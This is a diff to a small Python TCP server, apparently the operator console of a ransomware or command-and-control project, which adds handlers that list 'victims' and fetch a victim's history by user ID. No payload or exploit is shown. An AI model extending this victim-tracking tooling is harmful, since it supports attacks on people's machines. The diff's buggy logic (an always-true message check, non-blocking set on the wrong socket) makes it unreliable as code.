@@ -12,10 +12,14 @@
 # --------------------------------------------
 import socket
 import threading
+import time
+
 import security
 import os
 import binascii
 import utile.data as udata
+
+
 # --------------------------------------------
 # Classes & Functions
 # --------------------------------------------
@@ -35,32 +39,34 @@ class server_tcp(object):
         except socket.error as error:
             print(str(error))
         self.s.listen(10)
-        conn, addr = self.s.accept()
-        print(f'[+] New TCP Connexion from ' + str(addr[0])+":"+str(addr[1]))
+        self.conn, self.addr = self.s.accept()
+        print(f'[+] New TCP Connexion from ' + str(self.addr[0]) + ":" + str(self.addr[1]))
         # Implémentation sécurité : AES
-        # Send msg without coding syntax so we can read next informations
-        secu = security.SecurityLayer("Here's the key informations")
-        key = secu.key
-        nonce = secu.nonce
-        tag = secu.authTag
-        #conn.send(bytes(str(key), 'utf-8'))
-        #conn.send(bytes(str(nonce), 'utf-8'))
-        #conn.send(bytes(str(tag), 'utf-8'))
-        while 1:
-            msg = conn.recv(2048)
-            print(str(addr[0]) + " >> " + str(msg))
-            rs = str(self.gestion_msg(msg))
-            # @Todo: Build header & send it before msg
-            conn.send(bytes(rs, 'utf-8'))
+        # conn.send(bytes(str(key), 'utf-8'))
+        # conn.send(bytes(str(nonce), 'utf-8'))
+        # conn.send(bytes(str(tag), 'utf-8'))
+        while True:
+            self.s.setblocking(0)
+            msg = self.conn.recv(2048)
+
+            if msg is not None or msg != b'':
+                print(str(self.addr[0]) + " >> " + str(msg))
+                rs = str(self.gestion_msg(msg))
+                # @Todo: Build header & send it before msg
+                self.conn.send(bytes(rs, 'utf-8'))
+
 
 
     def gestion_msg(self, message):
         if message == b'1':
             return udata.list_victim()
         elif message == b'2':
-            return "Todo2"
+            self.conn.send(bytes('Please provide an user ID for the history', 'utf-8'))
+            id = self.conn.recv(2048).decode()
+            return udata.history_req(id)
         elif message == b'3':
             return "Todo3"
 
-srv = server_tcp("", 8380)
+
+srv = server_tcp("", 8382)
 srv.start_server()
